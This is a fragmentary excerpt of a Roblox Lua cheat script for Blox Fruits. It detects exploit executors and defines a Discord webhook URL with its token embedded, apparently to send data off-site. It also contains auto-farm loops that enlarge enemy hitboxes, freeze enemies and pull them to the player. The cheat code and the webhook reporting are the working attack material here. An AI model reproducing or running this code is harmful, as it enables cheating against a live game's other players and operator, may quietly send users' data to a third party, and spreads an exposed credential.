...
local executeor = syn and "SynapseX" or KRNL_LOADED and "Krnl"
local url = "https://discord.com/api/webhooks/1023442495926968321/FJ5oVq4t6JG80hjfG2xINyLRVB6LVhqobcMADTBvrnMdJWQKmmS8iRk0bsQeN8HuLKUS"
local data = {
    ["embeds"] = {
        {
...
spawn(function()
    while task.wait() do
        if _G.Bring and _G.AutoGunMas or _G.Bring and _G.AutoFruitMas or _G.Bring and _G.AutoRengoku or _G.Bring and _G.AutoEctoplasm or _G.Bring and _G.AutoFarmMaterial or _G.Bring and _G.AutoDoughKingV1 or _G.Bring and _G.AutoBartilo or _G.Bring and _G.AutoDoughKingV2 then
            pcall(function()
                for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                    for x,y in pairs(game.Workspace.Enemies:GetChildren()) do
                        if v.Name == y.Name then
                            v.HumanoidRootPart.Size = Vector3.new(100,100,100)
                            y.HumanoidRootPart.Size = Vector3.new(100,100,100)
...
spawn(function()
    while task.wait(.1) do
        if _G.AutoGunMas or _G.AutoFruitMas or _G.AutoCakeMon or _G.AutoRengoku or _G.AutoDeathStep or _G.AutoEctoplasm or _G.AutoFarmMaterial or _G.AutoFarm or _G.AutoBartilo or _G.AutoFarmBone or _G.AutoSez2 or _G.AutoRaceV2 or _G.AutoDoughKingV1 or _G.AutoElite or _G.AutoSharkman or _G.AutoDoughKingV2 then
            pcall(function()
                        ...
                        if v.Name == "Reborn Skeleton [Lv. 1975]" or v.Name == "Living Zombie [Lv. 2000]" or v.Name =="Demonic Soul [Lv. 2025]" or v.Name == "Posessed Mummy [Lv. 2050]" then
                            if v:FindFirstChild("HumanoidRootPart") then
                                repeat task.wait()
                                    ...
                                    v.Humanoid.WalkSpeed = 0
                                    v.Head.CanCollide = false
                                    AutoFarmBoneBring = v.HumanoidRootPart.CFrame
                                    Tween(v.HumanoidRootPart.CFrame * CFrame.new(_G.X,_G.Y,_G.Z))
...
spawn(function()
    while task.wait() do
        pcall(function()
            if _G.AutoFarmBone then
                for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                    if v.Name == "Reborn Skeleton [Lv. 1975]" or v.Name == "Living Zombie [Lv. 2000]" or v.Name =="Demonic Soul [Lv. 2025]" or v.Name == "Posessed Mummy [Lv. 2050]" and (v.HumanoidRootPart.Position - AutoFarmBoneBring.Position).Magnitude <= 250 and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                        v.Humanoid:ChangeState(14)
                        v.HumanoidRootPart.CanCollide = false
                        v.Head.CanCollide = false
                        v.HumanoidRootPart.CFrame = AutoFarmBoneBring
